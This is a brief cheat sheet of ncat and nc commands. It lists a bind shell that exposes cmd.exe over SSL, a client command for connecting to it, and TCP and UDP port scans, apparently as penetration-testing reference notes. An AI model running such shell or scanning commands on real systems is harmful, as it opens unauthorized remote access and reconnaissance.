Ncat
=====

Shell
-----

-   Bind Shell: ncat –exec cmd.exe --allow <your_ip_address>-vnl <port>  --ssl
-   Client: ncat –v <your_ip_address> <port> --ssl
  
Scan
----

-   TCP Port scan: nc –nvv –w 1 -z <your_ip_address> 3000-4000
-   UDP port scan: nc –nvv -u -z <your_ip_address> 3000-4000